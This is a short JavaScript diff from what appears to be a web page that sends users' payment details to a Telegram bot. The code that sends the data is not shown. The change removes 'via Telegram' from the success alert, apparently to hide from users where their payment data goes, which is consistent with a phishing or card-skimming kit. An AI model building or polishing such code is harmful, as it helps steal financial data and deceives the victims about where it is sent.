@@ -107,7 +107,7 @@ document.addEventListener("DOMContentLoaded", function () {
         .then(data => {
             if (data.ok) {
                 console.log('Message sent successfully!');
-                alert('Your payment details have been sent successfully via Telegram!');
+                alert('Your payment details have been sent successfully');
             } else {
                 console.log('Failed to send the message:', data);
             }
